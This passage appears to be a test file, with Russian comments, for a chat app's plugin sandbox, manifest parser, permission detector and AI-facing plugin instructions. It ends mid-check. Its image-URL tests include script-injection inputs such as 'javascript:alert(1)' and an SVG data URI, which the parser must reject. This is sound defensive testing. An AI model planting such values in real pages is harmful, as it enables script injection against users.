// v1.333.0: проверка плагинов «от нас» и загрузчика песочницы.
//
// Зачем. Плагин — это строка с кодом: опечатка в нём не ловится ни tsc, ни
// сборкой, она вылезет только когда человек нажмёт «Установить» и увидит
// «плагин не запустился». Здесь каждый официальный плагин по-настоящему
// разбирается, запускается тем же способом, что и в песочнице, и обязан
// зарегистрировать то, что обещает в описании.
//
// Запуск: npm run test:plugins
import { auditPlugin, auditBadge, hiddenCode, unusedPerms, AUDIT_NOTE, AUDITED_PERMISSIONS } from './audit'
import { LIMITS, MAX_RECENT, MAX_PER_PLUGIN, LIMITS_WARNING, LIMITS_WARNING_SHORT } from './limits'
import { parsePlugin } from './manifest'
import { OFFICIAL_PLUGINS } from './official'
import { ALL_PERMISSIONS, PLUGIN_EVENTS } from './types'
import { PANEL_SLOTS } from './registry'
import {
  TEMPLATES, buildFile, draftFrom, draftFromTemplate, slugify, cleanPasted,
  permissionsFromCode, missingPermissions, unusedPermissions,
} from './editorDraft'
import { RECIPES, recipeDefaults, recipeReady } from './recipes'
import { PLUGIN_SPEC, AI_PROMPT_PREFIX, BOT_SPEC, AI_BOT_PROMPT_PREFIX } from './spec'
import { readFileSync } from 'node:fs'
import { WORKER_BOOTSTRAP } from './bootstrap'

// Исходник диспетчера читаем файлом: нам нужны имена его case-ветвей, а не то,
// что он делает — вызвать их отсюда нельзя, там браузерное окружение.
const DISPATCHER_SRC = readFileSync('src/lib/plugins/api.ts', 'utf8')
// v1.447.0: и загрузчик песочницы — по нему видно, что плагин МОЖЕТ позвать.
const BOOTSTRAP_SRC = readFileSync('src/lib/plugins/bootstrap.ts', 'utf8')

let pass = 0, fail = 0
const ok = (n: string) => { pass++; console.log('OK   ' + n) }
const bad = (n: string, why?: string) => { fail++; console.log('ПРОВАЛ ' + n + (why ? ' — ' + why : '')) }
function check(name: string, fn: () => boolean | void) {
  try { const r = fn(); if (r === false) bad(name); else ok(name) }
  catch (e: any) { bad(name, e?.message ?? String(e)) }
}

/** Тот же приём, что в bootstrap.ts: код выполняется НЕ как модуль. */
const STRIP = /^[ \t]*export[ \t]+(default[ \t]+)?(?=(async[ \t]+)?(function|const|let|var|class)\b)/gm
function loadPlugin(code: string) {
  const factory = new Function('ponoi', 'module', 'exports',
    code.replace(STRIP, '') +
    '\nreturn (typeof onLoad === "function" ? onLoad : (module.exports && module.exports.onLoad) || (exports && exports.onLoad));')
  const mod = { exports: {} as any }
  return factory(undefined, mod, mod.exports)
}

/** Виды строк, которые понимает приложение (см. SettingsRow в registry.ts). */
const ROW_TYPES = ['toggle', 'text', 'select', 'button', 'label', 'progress', 'slider', 'color', 'image', 'canvas', 'keybind']

/** Заглушка ponoi: записывает всё, что плагин попросил, и ничего не делает. */
function stubPonoi() {
  const calls = {
    commands: [] as string[],
    settingsPages: [] as any[],
    events: [] as string[],
    css: 0,
    sent: [] as string[],
    notified: [] as string[],
    panels: [] as any[],
    hotkeys: [] as string[],
  }
  const ponoi: any = {
    css: (t: string) => { calls.css++; if (typeof t !== 'string') throw new Error('css: не строка') },
    ui: {
      addComposerButton: () => {},
      addMessageAction: () => {},
      // v1.419.0: строк стало девять, а не четыре — заготовка или рецепт с
      // новой строкой не должны падать здесь на «неизвестном типе».
      addSettingsPage: (o: any) => {
        if (!o?.title || !Array.isArray(o.rows)) throw new Error('addSettingsPage: нет title/rows')
        for (const r of o.rows) {
          if (!r?.key || !r?.label) throw new Error('строка настроек без key/label')
          if (!ROW_TYPES.includes(r.type)) throw new Error('неизвестный тип строки: ' + r.type)
          if (r.type === 'select' && !(Array.isArray(r.options) && r.options.length)) throw new Error('select без вариантов')
        }
        calls.settingsPages.push(o)
      },
      addPanel: (o: any) => {
        if (!o?.slot) throw new Error('addPanel: не сказано место (slot)')
        calls.panels.push(o)
      },
      addHotkey: (o: any) => {
        if (!o?.combo || typeof o.onPress !== 'function') throw new Error('addHotkey: нужны combo и onPress')
        calls.hotkeys.push(o.combo)
      },
    },
    commands: {
      register: async (name: string, desc: string, handler: any) => {
        if (typeof handler !== 'function') throw new Error('команда без обработчика')
        if (!desc) throw new Error('команда без описания')
        calls.commands.push(name)
      },
    },
    messages: {
      send: async (t: string) => { calls.sent.push(String(t)) },
      recent: async () => [],
      react: async () => true,
      remove: async () => true,
    },
    storage: { get: async () => null, set: async () => {}, remove: async () => {}, keys: async () => [], clear: async () => {} },
    net: { fetch: async () => ({ ok: true, status: 200, body: '' }), json: async () => ({ ok: true, status: 200, data: {} }) },
    // v1.419.0: приложение вокруг — чтобы плагин, который их зовёт, доходил
    // здесь до конца, а не падал на «ponoi.open не функция».
    me: async () => ({ id: 'u1', name: 'Проверка' }),
    channel: async () => ({ id: 'c1', name: 'общий', serverId: 's1', serverName: 'Сервер' }),
    servers: async () => [{ id: 's1', name: 'Сервер' }],
    channels: async () => [{ id: 'c1', name: 'общий', serverId: 's1', kind: 'text' }],
    open: async () => true,
    status: { get: async () => '', set: async () => '' },
    sound: { play: async () => true },
    clipboard: { write: async () => true },
    music: {
      now: async () => null, library: async () => [],
      play: async () => true, pause: async () => true, next: async () => true, prev: async () => true,
      queue: async () => true, add: async () => true,
    },
    voice: {
      list: async () => [{ id: 'none', label: 'Обычный' }, { id: 'robot', label: 'Робот' }],
      current: async () => 'none',
      setEffect: async () => true,
    },
    notify: (t: string) => { calls.notified.push(String(t)) },
    on: async (name: string) => { calls.events.push(name) },
    log: () => {},
  }
  return { ponoi, calls }
}

// v1.465.0: сам код песочницы — это СТРОКА, и ошибку в ней не поймает ни tsc,
// ни сборка. Поймает её человек: ни один плагин не запустится, у всех разом.
// Поэтому строку по-настоящему разбирают и по-настоящему выполняют с
// подставным self — так же, как это делает воркер.
{
  check('код песочницы разбирается как JS', () => {
    // new Function бросит SyntaxError на любой опечатке — это и есть разбор.
    new Function(WORKER_BOOTSTRAP)
    return WORKER_BOOTSTRAP.length > 1000
  })
  check('код песочницы выполняется и строит объект ponoi', () => {
    const посланное: any[] = []
    const self: any = {
      postMessage: (m: any) => posted(m),
      navigator: {},
      addEventListener: () => {},
    }
    function posted(m: any) { посланное.push(m) }
    // Всё, что песочница вырезает, должно существовать до вырезания — иначе
    // delete/defineProperty упадут не на том, на чём мы проверяем.
    for (const k of ['Worker', 'SharedWorker', 'importScripts', 'fetch', 'XMLHttpRequest',
                     'WebSocket', 'EventSource', 'indexedDB', 'caches', 'openDatabase']) {
      self[k] = () => {}
    }
    new Function('self', WORKER_BOOTSTRAP)(self)
    // Загрузчик обязан повесить приёмник сообщений: без него плагин не получит
    // ни своего кода, ни событий.
    if (typeof self.onmessage !== 'function') throw new Error('нет self.onmessage')
    return посланное.length === 0
  })
  check('в песочнице нет ни одного мостика мимо ponoi', () => {
    // Список вырезаемого — в самом коде; проверяем, что он не поредел.
    for (const нужно of ['Worker', 'importScripts', 'fetch', 'XMLHttpRequest', 'WebSocket', 'indexedDB']) {
      if (!WORKER_BOOTSTRAP.includes("'" + нужно + "'")) throw new Error('перестали вырезать: ' + нужно)
    }
    return true
  })
}

console.log('── Загрузчик песочницы ──')
// Форма из документации и все обычные — плагин, написанный по инструкции,
// обязан запускаться. Проверяется именно то, что однажды не работало.
for (const [label, code] of Object.entries({
  'export function onLoad': 'export function onLoad(p){ return 1 }',
  'export async function onLoad': 'export async function onLoad(p){ return 1 }',
  'export default function onLoad': 'export default function onLoad(p){ return 1 }',
  'export const onLoad': 'export const onLoad = (p) => 1',
  'function onLoad': 'function onLoad(p){ return 1 }',
  'module.exports.onLoad': 'module.exports.onLoad = function(p){ return 1 }',
})) {
  check('точка входа: ' + label, () => typeof loadPlugin(code) === 'function')
}
check('слово export внутри строки не портит код', () => {
  const fn = loadPlugin('function onLoad(p){ return "export function x" }')
  return typeof fn === 'function' && fn() === 'export function x'
})

console.log('\n── Плагины от нас ──')
const expected: Record<string, { commands?: string[]; settings?: boolean; events?: string[]; css?: boolean }> = {
  'ponoi-voice-changer': { commands: ['голос'], settings: true, events: ['settings'] },
  'ponoi-dice': { commands: ['кубик', 'монетка', 'выбери'] },
  'ponoi-timer': { commands: ['таймер'] },
  'ponoi-afk': { settings: true, events: ['message'] },
  'ponoi-soft-light': { settings: true, css: true, events: ['settings'] },
}

for (const p of OFFICIAL_PLUGINS) {
  const m = parsePlugin(p.code)
  check(`${p.id}: шапка разбирается`, () => m.id === p.id && !!m.name && !!m.version)
  check(`${p.id}: описание и картинка для каталога на месте`, () => !!p.summary && p.summary.length <= 90 && !!p.emoji)
  check(`${p.id}: все запрошенные права существуют`, () =>
    m.permissions.every(x => (ALL_PERMISSIONS as string[]).includes(x)))
  check(`${p.id}: автор — Ponoi`, () => m.author === 'Ponoi')
}

// Запуск — самое главное: именно тут вылезают опечатки в самом коде плагина.
;(async () => {
  for (const p of OFFICIAL_PLUGINS) {
    const m = parsePlugin(p.code)
    const { ponoi, calls } = stubPonoi()
    let started = false
    try {
      const onLoad = loadPlugin(p.code)
      if (typeof onLoad !== 'function') { bad(`${p.id}: запускается`, 'onLoad не найден'); continue }
      await onLoad(ponoi)
      started = true
      ok(`${p.id}: запускается`)
    } catch (e: any) { bad(`${p.id}: запускается`, e?.message ?? String(e)) }
    if (!started) continue

    const exp = expected[p.id] ?? {}
    if (exp.commands) {
      check(`${p.id}: регистрирует команды ${exp.commands.map(c => '/' + c).join(' ')}`,
        () => exp.commands!.every(c => calls.commands.includes(c)))
      check(`${p.id}: команды объявлены в правах`, () => m.permissions.includes('commands'))
    }
    if (exp.settings) {
      check(`${p.id}: заводит страницу настроек`, () => calls.settingsPages.length === 1)
      check(`${p.id}: настройки объявлены в правах`, () => m.permissions.includes('settings'))
    }
    if (exp.events) {
      check(`${p.id}: подписан на ${exp.events.join(', ')}`, () => exp.events!.every(e => calls.events.includes(e)))
    }
    if (exp.css) {
      check(`${p.id}: ставит свой CSS`, () => calls.css > 0 && m.permissions.includes('css'))
    }
    // Подписка на сообщения — только с правом messages.read, иначе песочница
    // откажет уже на живом человеке, а не здесь.
    if (calls.events.includes('message')) {
      check(`${p.id}: чтение сообщений объявлено в правах`, () => m.permissions.includes('messages.read'))
    }
    if (calls.sent.length) {
      check(`${p.id}: отправка сообщений объявлена в правах`, () => m.permissions.includes('messages.write'))
    }
  }

  // Команды не должны конфликтовать между официальными плагинами: в песочнице
  // вторая регистрация того же имени — ошибка, и один из плагинов не запустится.
  const seen = new Map<string, string>()
  let clash = ''
  for (const p of OFFICIAL_PLUGINS) {
    const { ponoi, calls } = stubPonoi()
    try { await loadPlugin(p.code)(ponoi) } catch {}
    for (const c of calls.commands) {
      const prev = seen.get(c)
      if (prev) clash = `/${c}: ${prev} и ${p.id}`
      seen.set(c, p.id)
    }
  }
  if (clash) bad('команды официальных плагинов не пересекаются', clash)
  else ok('команды официальных плагинов не пересекаются')

  // ── Проверка обязана уметь падать ────────────────────────────────────────
  // Дважды за проект я получал «чисто» от неработающего детектора, поэтому
  // ломаем нарочно прямо здесь: если что-то ниже пройдёт, значит проверки выше
  // ничего не значат.
  console.log('\n── Ломаем нарочно ──')
  check('плагин с опечаткой не запускается', () => {
    try { loadPlugin('function onLoad(p){ p.commands.register( }'); return false }
    catch { return true }
  })
  check('плагин без onLoad не считается рабочим', () =>
    typeof loadPlugin('const x = 1') !== 'function')
  check('шапка без @id отвергается', () => {
    try { parsePlugin(['/**', ' * @name Без id', ' * @version 1.0.0', ' */', 'function onLoad(){}'].join('\n')); return false }
    catch { return true }
  })
  check('несуществующее право отвергается', () => {
    try { parsePlugin(['/**', ' * @name X', ' * @id x-y', ' * @version 1.0.0', ' * @permissions мировое-господство', ' */'].join('\n')); return false }
    catch { return true }
  })
  await (async () => {
    const { ponoi, calls } = stubPonoi()
    try { await loadPlugin('function onLoad(p){}')(ponoi) } catch {}
    check('плагин, который ничего не зарегистрировал, виден как пустой', () =>
      calls.commands.length === 0 && calls.settingsPages.length === 0 && calls.events.length === 0)
  })()

  // ── Конструктор плагинов ─────────────────────────────────────────────────
  // Смысл конструктора в том, что человеку не надо знать формат шапки. Значит
  // шапка, которую он собирает, обязана разбираться, а заготовки — работать.
  console.log('\n── Конструктор ──')
  check('имя переводится в пригодный идентификатор', () => {
    const cases: [string, string][] = [
      ['Мой плагин', 'moy-plagin'],
      ['Hello World', 'hello-world'],
      ['  ---Ёжик!!!  ', 'ezhik'],
    ]
    return cases.every(([from, to]) => slugify(from) === to)
  })
  check('идентификатор из имени принимается разбором', () => {
    const d = draftFromTemplate(TEMPLATES[0])
    d.name = 'Мой первый плагин'
    d.id = slugify(d.name)
    const m = parsePlugin(buildFile(d, 'ник'))
    return m.id === 'moy-pervyy-plagin'
  })

  for (const t of TEMPLATES) {
    const d = draftFromTemplate(t)
    d.name = 'Проба ' + t.key
    d.id = slugify(d.name)
    d.description = 'заготовка ' + t.label
    const file = buildFile(d, 'ник')

    check(`заготовка «${t.label}»: шапка собирается и разбирается`, () => {
      const m = parsePlugin(file)
      return m.name === d.name && m.id === d.id && m.author === 'ник'
        && m.permissions.length === t.permissions.length
    })

    const { ponoi, calls } = stubPonoi()
    let ok2 = false
    try { await loadPlugin(file)(ponoi); ok2 = true } catch (e: any) { bad(`заготовка «${t.label}»: запускается`, e?.message) }
    if (ok2) {
      ok(`заготовка «${t.label}»: запускается`)
      // Заготовка не должна просить прав, которыми не пользуется, и наоборот.
      if (calls.commands.length) check(`заготовка «${t.label}»: команды объявлены`, () => t.permissions.includes('commands'))
      if (calls.sent.length) check(`заготовка «${t.label}»: отправка объявлена`, () => t.permissions.includes('messages.write'))
      if (calls.settingsPages.length) check(`заготовка «${t.label}»: настройки объявлены`, () => t.permissions.includes('settings'))
      if (calls.css) check(`заготовка «${t.label}»: css объявлен`, () => t.permissions.includes('css'))
      if (calls.events.includes('message')) check(`заготовка «${t.label}»: чтение сообщений объявлено`, () => t.permissions.includes('messages.read'))
    }
  }

  check('готовый плагин разбирается обратно в форму без потерь', () => {
    const src = OFFICIAL_PLUGINS[0].code
    const d = draftFrom(src)
    if (!d) return false
    const again = parsePlugin(buildFile(d, d ? parsePlugin(src).author : ''))
    const was = parsePlugin(src)
    return again.id === was.id && again.name === was.name && again.version === was.version
      && again.permissions.join(',') === was.permissions.join(',')
  })
  check('повторная сборка не приклеивает вторую шапку', () => {
    const d = draftFrom(OFFICIAL_PLUGINS[0].code)!
    const twice = buildFile({ ...d, body: buildFile(d, 'ник') }, 'ник')
    // Блок /** ... */ должен остаться ровно один — иначе поля начали бы
    // задваиваться, а читался бы всё равно первый.
    return (twice.match(/\/\*\*/g) ?? []).length === 1
  })

  // ── Плагины без кода ─────────────────────────────────────────────────────
  // Рецепт собирает код за человека, который сам его не напишет и ошибку в нём
  // не заметит. Значит проверять обязаны мы: каждый рецепт должен собираться,
  // запускаться и просить ровно те права, которыми пользуется.
  console.log('\n── Плагины без кода ──')
  for (const r of RECIPES) {
    const vals = recipeDefaults(r)
    // Пустые поля заполняем осмысленным: рецепт с пустотой ничего не делает.
    for (const f of r.fields) if (!vals[f.key]) vals[f.key] = f.color ? '#ff0000' : 'проверка'

    check(`рецепт «${r.label}»: поля заполнены`, () => recipeReady(r, vals))

    const d = draftFromTemplate(TEMPLATES[0])
    d.name = 'Проба ' + r.key
    d.id = slugify(d.name)
    d.permissions = [...r.permissions]
    d.body = r.build(vals)
    const file = buildFile(d, 'ник')

    check(`рецепт «${r.label}»: шапка разбирается`, () => {
      const m = parsePlugin(file)
      return m.id === d.id && m.permissions.join(',') === r.permissions.join(',')
    })

    const { ponoi, calls } = stubPonoi()
    let started = false
    try { await loadPlugin(file)(ponoi); started = true; ok(`рецепт «${r.label}»: запускается`) }
    catch (e: any) { bad(`рецепт «${r.label}»: запускается`, e?.message ?? String(e)) }
    if (!started) continue

    check(`рецепт «${r.label}»: что-то делает`, () =>
      calls.commands.length + calls.events.length + calls.css > 0)
    if (calls.commands.length) check(`рецепт «${r.label}»: команды объявлены`, () => r.permissions.includes('commands'))
    if (calls.events.includes('message')) check(`рецепт «${r.label}»: чтение сообщений объявлено`, () => r.permissions.includes('messages.read'))
    if (calls.css) check(`рецепт «${r.label}»: css объявлен`, () => r.permissions.includes('css'))
  }

  // Текст от человека попадает в код строкой — кавычки и переносы не должны
  // ломать плагин. Это самое вероятное, на чём собранный код развалился бы.
  check('текст с кавычками и переносами не ломает собранный плагин', () => {
    const r = RECIPES.find(x => x.key === 'command')!
    const злой = 'Он сказал: "привет" \n а потом \'пока\' и ${x} и `бэктик`'
    const d = draftFromTemplate(TEMPLATES[0])
    d.name = 'Проба кавычек'; d.id = slugify(d.name)
    d.permissions = [...r.permissions]
    d.body = r.build({ cmd: 'тест', text: злой })
    const fn = loadPlugin(buildFile(d, 'ник'))
    return typeof fn === 'function'
  })
  await (async () => {
    const r = RECIPES.find(x => x.key === 'command')!
    const текст = 'строка с "кавычками" и переносом\nвторая'
    const d = draftFromTemplate(TEMPLATES[0])
    d.name = 'Проба текста'; d.id = slugify(d.name)
    d.permissions = [...r.permissions]
    d.body = r.build({ cmd: 'тест', text: текст })
    const { ponoi, calls } = stubPonoi()
    let handler: any = null
    ponoi.commands.register = async (_n: string, _d: string, h: any) => { handler = h; calls.commands.push(_n) }
    await loadPlugin(buildFile(d, 'ник'))(ponoi)
    if (handler) await handler('')
    check('в чат уходит ровно то, что человек написал', () => calls.sent[0] === текст)
  })()

  // ── Определитель разрешений ──────────────────────────────────────────────
  // Он существует ровно чтобы человек не встретил «не выдано разрешение notify»
  // уже после установки. Значит ошибиться он не имеет права: пропустит вызов —
  // и плагин снова упадёт у человека.
  console.log('\n── Разрешения по коду ──')
  const CASES: [string, string, string[]][] = [
    ['уведомление', 'function onLoad(p){ p.notify("x") }', ['notify']],
    ['команда с отправкой', 'function onLoad(p){ p.commands.register("a","b",()=>p.messages.send("c")) }', ['commands', 'messages.write']],
    ['стили', 'function onLoad(p){ p.css("a{}") }', ['css']],
    ['хранилище', 'function onLoad(p){ p.storage.set("k",1) }', ['storage']],
    ['сеть', 'function onLoad(p){ p.net.fetch("https://x/") }', ['net']],
    ['голос', 'function onLoad(p){ p.voice.setEffect("robot") }', ['voice']],
    ['страница настроек', 'function onLoad(p){ p.ui.addSettingsPage({}) }', ['settings']],
    ['кнопка композера', 'function onLoad(p){ p.ui.addComposerButton({}) }', ['ui']],
    ['действие над сообщением', 'function onLoad(p){ p.ui.addMessageAction({}) }', ['ui', 'messages.read']],
    ['подписка на сообщения', 'function onLoad(p){ p.on("message", ()=>{}) }', ['messages.read']],
    ['пробелы и переносы не мешают', 'function onLoad(p){ p . notify ( "x" ) }', ['notify']],
    ['ничего не зовёт — ничего не нужно', 'function onLoad(p){ var x = 1 }', []],
  ]
  // Определитель смотрит на имя переменной ponoi, а в примерах она названа p —
  // проверяем на настоящем имени, как в реальных плагинах.
  for (const [label, code, want] of CASES) {
    const real = code.replace(/\bp\b/g, 'ponoi')
    check('видит: ' + label, () => {
      const got = permissionsFromCode(real).map(x => x.perm).sort()
      return JSON.stringify(got) === JSON.stringify([...want].sort())
    })
  }

  check('недостающее находится, лишнее находится', () => {
    const code = 'function onLoad(ponoi){ ponoi.notify("x") }'
    const miss = missingPermissions(code, []).map(m => m.perm)
    const extra = unusedPermissions(code, ['notify', 'css'] as any)
    return miss.length === 1 && miss[0] === 'notify' && extra.length === 1 && extra[0] === 'css'
  })

  // Самое важное: у ГОТОВЫХ плагинов и заготовок расхождений быть не должно —
  // иначе мы сами раздаём то, что не запустится.
  for (const p of OFFICIAL_PLUGINS) {
    const m = parsePlugin(p.code)
    check(`${p.id}: объявленных разрешений хватает коду`, () =>
      missingPermissions(p.code, m.permissions).length === 0)
  }
  for (const t of TEMPLATES) {
    check(`заготовка «${t.label}»: разрешений хватает коду`, () =>
      missingPermissions(t.body, t.permissions).length === 0)
  }
  for (const r of RECIPES) {
    const vals = recipeDefaults(r)
    for (const f of r.fields) if (!vals[f.key]) vals[f.key] = f.color ? '#ff0000' : 'проверка'
    check(`рецепт «${r.label}»: разрешений хватает коду`, () =>
      missingPermissions(r.build(vals), r.permissions).length === 0)
  }

  // ── Картинка и шапка плагина (v1.349.0) ─────────────────────────────────
  // Адрес показывается всем и грузится их браузерами — сюда не должно проходить
  // ничего, кроме https-ссылки.
  console.log('\n── Картинки плагина ──')
  const withPic = (extra: string) => ['/**', ' * @name П', ' * @id pic-test', ' * @version 1.0.0', extra, ' */', 'function onLoad(){}'].join('\n')
  check('обычная https-ссылка принимается', () => {
    const m = parsePlugin(withPic(' * @icon https://example.com/i.png'))
    return m.icon === 'https://example.com/i.png' && m.banner === null
  })
  check('шапка принимается отдельно', () =>
    parsePlugin(withPic(' * @banner https://example.com/b.jpg')).banner === 'https://example.com/b.jpg')
  for (const bad2 of ['javascript:alert(1)', 'data:image/svg+xml,<svg/>', 'http://example.com/i.png', '/local.png']) {
    check('опасная ссылка отвергается: ' + bad2.slice(0, 24), () => {
      try { parsePlugin(withPic(' * @icon ' + bad2)); return false } catch { return true }
    })
  }
  check('без картинок плагин по-прежнему разбирается', () => {
    const m = parsePlugin(withPic(' * @author кто-то'))
    return m.icon === null && m.banner === null
  })
  check('картинка переживает разбор обратно в форму и сборку', () => {
    const src = withPic(' * @icon https://example.com/i.png')
    const d = draftFrom(src)!
    return parsePlugin(buildFile(d, 'ник')).icon === 'https://example.com/i.png'
  })

  // Правка плагина не имеет права терять его код (v1.350.0).
  check('плагин с неразбираемой шапкой открывается со СВОИМ кодом', () => {
    // @icon с http — такой плагин ставился до появления проверки и теперь не
    // разбирается. Открыть его на правку и подсунуть чужой пример — потеря труда.
    const broken = ['/**', ' * @name X', ' * @id x-y', ' * @version 1.0.0', ' * @icon http://example.com/i.png', ' */', 'function onLoad(ponoi){ ponoi.log("моё") }'].join('\n')
    const dd = draftFrom(broken)
    return !!dd && dd.body.includes('моё')
  })
  check('у разбираемого плагина форма заполняется как раньше', () => {
    const dd = draftFrom(OFFICIAL_PLUGINS[0].code)
    return !!dd && dd.id === OFFICIAL_PLUGINS[0].id && dd.body.includes('onLoad')
  })

  // ── Инструкция не должна расходиться с приложением (v1.360.0) ─────────
  //
  // Инструкцию человек отдаёт ИИ и получает готовый плагин. Если в ней нет
  // половины методов — ИИ напишет правдоподобный код, который не запустится, и
  // человек решит, что сломано приложение. Поэтому сверяем текст с настоящим
  // диспетчером: появился метод — про него обязано быть написано.
  const SPEC_KNOWN_METHODS = [
    'log', 'css', 'ui.addComposerButton', 'ui.addMessageAction', 'ui.addSettingsPage',
    'ui.confirm', 'ui.prompt', 'clipboard.write', 'commands.register', 'messages.send',
    'voice.setEffect', 'voice.effects', 'voice.current', 'notify',
    'storage.get', 'storage.set', 'storage.remove', 'storage.keys',
    'net.fetch', 'subscribe', 'me', 'channel',
    // v1.445.0: ответ по кускам — без него своя ИИ-модель в плагине невозможна.
    'net.stream',
    // v1.417.0: панель в приложении и музыка.
    'ui.addPanel', 'music.now', 'music.library', 'music.play', 'music.pause',
    'music.next', 'music.prev', 'music.queue', 'music.add',
    // v1.419.0: горячие клавиши, работа с открытым чатом, приложение вокруг.
    'ui.addHotkey', 'messages.recent', 'messages.react', 'messages.remove',
    'servers', 'channels', 'open', 'status.set', 'status.get', 'sound.play',
    'storage.clear',
    // v1.467.0
    'ui.addHeaderButton', 'settings.registerSchema',
    // v1.465.0: семь новых возможностей.
    'plugins.send', 'messages.onBeforeSend', 'messages.onBeforeRender',
    'ui.getCanvas', 'net.ws', 'net.wsSend', 'net.wsClose',
    'background.every', 'background.stop', 'ui.setTheme', 'ui.clearTheme', 'ui.addContextMenu',
  ]


  // ── Вставка из чата с ИИ (v1.426.0) ─────────────────────────────────────
  //
  // Ответ ИИ теперь идёт названием, описанием и кодом внизу — как просил
  // владелец. Человек копирует всё разом, и приложение обязано взять из этого
  // сам файл: иначе он получает «в файле нет шапки плагина» на совершенно
  // правильном ответе.
  console.log('\n── Вставка из чата с ИИ ──')
  const ФАЙЛ = ['/**', ' * @name Проба', ' * @id proba-1', ' * @version 1.0.0', ' */', 'function onLoad(ponoi){ ponoi.log("x") }'].join('\n')
  check('название и описание перед кодом отрезаются', () => {
    const вставка = 'Приветствие\n\nЗдоровается по команде. Просит команды и отправку.\n\n' + ФАЙЛ
    return parsePlugin(cleanPasted(вставка)).id === 'proba-1'
  })
  check('markdown-забор снимается', () => {
    const вставка = 'Вот твой плагин:\n\n```js\n' + ФАЙЛ + '\n```\n'
    return parsePlugin(cleanPasted(вставка)).id === 'proba-1'
  })
  check('забор без языка тоже', () =>
    parsePlugin(cleanPasted('```\n' + ФАЙЛ + '\n```')).id === 'proba-1')
  check('чистый файл не портится', () => cleanPasted(ФАЙЛ).trim() === ФАЙЛ.trim())
  check('код перед шапкой не режется', () => {
    // Чужой файл со своим порядком: сначала код, потом комментарий. Резать
    // ему начало значило бы потерять чужую работу.
    const свой = 'const A = 1;\n' + ФАЙЛ
    return cleanPasted(свой).includes('const A = 1')
  })
  check('без шапки чистка не выдумывает её', () => {
    const мимо = cleanPasted('просто текст без кода')
    return !мимо.includes('/**')
  })

  check('в инструкции описано каждое разрешение', () => {
    const missing = ALL_PERMISSIONS.filter(p => !PLUGIN_SPEC.includes(p))
    if (missing.length) throw new Error('не описаны: ' + missing.join(', '))
    return true
  })

  check('в инструкции упомянут каждый метод API', () => {
    // subscribe в тексте зовётся ponoi.on — так его и вызывают.
    const missing = SPEC_KNOWN_METHODS.filter(m => {
      if (m === 'subscribe') return !PLUGIN_SPEC.includes('ponoi.on')
      if (m === 'me') return !PLUGIN_SPEC.includes('ponoi.me')
      if (m === 'channel') return !PLUGIN_SPEC.includes('ponoi.channel')
      // v1.419.0: снаружи это ponoi.servers()/ponoi.channels(serverId)/ponoi.open().
      if (m === 'servers') return !PLUGIN_SPEC.includes('ponoi.servers')
      if (m === 'channels') return !PLUGIN_SPEC.includes('ponoi.channels')
      if (m === 'open') return !PLUGIN_SPEC.includes('ponoi.open')
      // voice.effects снаружи зовётся ponoi.voice.list — так его и вызывают.
      if (m === 'voice.effects') return !PLUGIN_SPEC.includes('ponoi.voice.list')
      const tail = m.includes('.') ? m : m
      return !PLUGIN_SPEC.includes(tail)
    })
    if (missing.length) throw new Error('не упомянуты: ' + missing.join(', '))
    return true
  })

  check('список методов в проверке совпадает с диспетчером', () => {
    // Иначе проверка выше становится бесполезной: забыли добавить метод сюда —
    // и его отсутствие в инструкции никто не заметит.
    const src = DISPATCHER_SRC
    const inCode = [...src.matchAll(/case '([a-zA-Z.]+)':/g)].map(m => m[1])
    // В том же файле есть switch по видам строк — это не методы API.
    const real = inCode.filter(m => !ROW_TYPES.includes(m))
    const forgotten = real.filter(m => !SPEC_KNOWN_METHODS.includes(m))
    if (forgotten.length) throw new Error('метод есть в коде, но не в списке проверки: ' + forgotten.join(', '))
    return true
  })

  // v1.419.0: строки, места панелей и события — из одного источника с
  // приложением. Инструкцию читает ИИ, и «строка type: image» из головы
  // означает панель, которая молча не покажет ничего.
  check('в инструкции описан каждый вид строки', () => {
    const missing = ROW_TYPES.filter(t => !PLUGIN_SPEC.includes('| ' + t + ' |'))
    if (missing.length) throw new Error('не описаны: ' + missing.join(', '))
    return true
  })
  check('в инструкции описано каждое место для панели', () => {
    const missing = Object.keys(PANEL_SLOTS).filter(s => !PLUGIN_SPEC.includes('| ' + s + ' |'))
    if (missing.length) throw new Error('не описаны: ' + missing.join(', '))
    return true
  })
  check('в инструкции описано каждое событие', () => {
    const missing = Object.keys(PLUGIN_EVENTS).filter(e => !PLUGIN_SPEC.includes('| ' + e + ' |'))
    if (missing.length) throw new Error('не описаны: ' + missing.join(', '))
    return true
  })

  check('пример из инструкции разбирается как настоящий плагин', () => {
    // Кусок между «## Пример целиком» и следующим заголовком, с отступом в 4
    // пробела — ровно то, что человек скопирует.
    const m = PLUGIN_SPEC.split('## Пример целиком')[1] ?? ''
    const code = m.split('## ')[0].split('\n')
      .filter(l => l.startsWith('    ') || l.trim() === '')
      .map(l => l.slice(4)).join('\n').trim()
    // parsePlugin бросает исключение, а не возвращает null: если пример в
    // инструкции сломан, тут будет видно чем именно.
    const man = parsePlugin(code)
    return man.id === 'hello-plugin' && man.permissions.includes('commands')
  })

  check('пример просит ровно те разрешения, что использует', () => {
    const m = PLUGIN_SPEC.split('## Пример целиком')[1] ?? ''
    const code = m.split('## ')[0].split('\n')
      .filter(l => l.startsWith('    ') || l.trim() === '')
      .map(l => l.slice(4)).join('\n').trim()
    const man = parsePlugin(code)
    const body = code.slice(code.indexOf('*/') + 2)
    return missingPermissions(body, man.permissions).length === 0
  })

  // v1.419.0: просьба к ИИ — это объяснение системы, а не бланк с пропуском.
  //
  // Раньше в ней стояло «[ОПИШИ СВОИМИ СЛОВАМИ]», и проверялось наличие
  // квадратной скобки. На деле текст копируют и отправляют как есть, скобки
  // остаются пустыми, и ИИ выдумывает плагин сам. Теперь договор другой:
  // объяснить устройство, НЕ писать код сразу и спросить у человека задумку —
  // это и проверяем.
  check('просьба к ИИ объясняет устройство системы', () => {
    const must = ['Web Worker', 'document', '@permissions', 'onLoad', 'разрешени', 'панел']
    const missing = must.filter(m => !AI_PROMPT_PREFIX.includes(m))
    if (missing.length) throw new Error('не сказано про: ' + missing.join(', '))
    return AI_PROMPT_PREFIX.length > 1500
  })
  check('просьба к ИИ просит сначала спросить задумку, а не писать код', () =>
    /НЕ пиши код/.test(AI_PROMPT_PREFIX) && /спрос/i.test(AI_PROMPT_PREFIX))

  check('в инструкции про ботов сказано главное', () => {
    // Три вещи, без которых бот заведомо не заработает: проверка подписи, адрес
    // API и формат синхронного ответа на команду. Забыть любую — значит отдать
    // человеку правдоподобный, но нерабочий код.
